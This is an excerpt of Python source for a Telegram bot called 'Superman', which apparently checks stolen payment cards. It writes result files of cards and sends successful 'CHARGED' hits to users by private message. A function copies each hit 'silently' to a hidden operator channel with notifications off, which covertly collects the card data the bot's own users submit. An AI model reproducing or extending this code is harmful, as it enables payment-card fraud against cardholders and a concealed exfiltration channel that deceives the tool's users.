...
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BOT IDENTITY — Superman
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CHANNEL_LINK = "https://t.me/superman8585_bot"
BOT_NAME     = "Superman"
...
def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
    ...
    filename  = f"Superman_{type_map.get(result_type, 'ALL')}_{timestamp}.txt"
    return file_buffer, filename, len(cards_list)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT LOG TO SECRET CHANNEL — CHARGED only
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
...
async def send_hit_log_to_group(
    ...
    """Sends the hit silently to the Secret Channel"""
    ...
    try:
        await bot.send_message(
            chat_id=SECRET_CHANNEL_ID, text=caption,
            parse_mode="HTML", disable_web_page_preview=True,
            reply_markup=reply_markup,
            disable_notification=True
        )
    except Exception as e:
        logging.error(f"[MSH] Error sending hit log to secret channel: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DM TO USER — CHARGED only
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
...
async def send_charged_dm(
    ...
    """DM the CHARGED hit to user's private chat."""
